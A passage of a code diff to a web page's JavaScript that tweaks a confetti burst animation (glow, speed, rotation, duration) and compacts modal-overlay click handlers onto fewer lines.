+                confetti.style.width = '8px'; confetti.style.height = '8px';
                 confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
                 confetti.style.borderRadius = '50%';
-                confetti.style.left = '50%';
-                confetti.style.top = '50%';
-                confetti.style.zIndex = '9999';
-                confetti.style.pointerEvents = 'none';
+                confetti.style.left = '50%'; confetti.style.top = '50%';
+                confetti.style.zIndex = '9999'; confetti.style.pointerEvents = 'none';
+                confetti.style.boxShadow = `0 0 10px ${confetti.style.backgroundColor}`;
                 document.body.appendChild(confetti);
-                
                 const angle = Math.random() * Math.PI * 2;
-                const velocity = 5 + Math.random() * 10;
+                const velocity = 5 + Math.random() * 12;
                 const tx = Math.cos(angle) * velocity * 20;
                 const ty = Math.sin(angle) * velocity * 20;
-                
                 confetti.animate([
                     { transform: 'translate(-50%, -50%) scale(1)', opacity: 1 },
-                    { transform: `translate(calc(-50% + ${tx}px), calc(-50% + ${ty}px)) scale(0)`, opacity: 0 }
-                ], {
-                    duration: 1000 + Math.random() * 500,
-                    easing: 'cubic-bezier(0, .9, .57, 1)'
-                }).onfinish = () => confetti.remove();
+                    { transform: `translate(calc(-50% + ${tx}px), calc(-50% + ${ty}px)) scale(0) rotate(720deg)`, opacity: 0 }
+                ], { duration: 1200 + Math.random() * 600, easing: 'cubic-bezier(0, .9, .57, 1)' }).onfinish = () => confetti.remove();
             }
         }
 
         document.querySelectorAll('.modal-overlay').forEach(overlay => {
-            overlay.addEventListener('click', (e) => {
-                if (e.target === overlay) closeModal(overlay.id);
-            });
+            overlay.addEventListener('click', (e) => { if (e.target === overlay) closeModal(overlay.id); });
         });
-
         document.querySelectorAll('.modal-box').forEach(box => {
             box.addEventListener('click', (e) => { e.stopPropagation(); });
         });
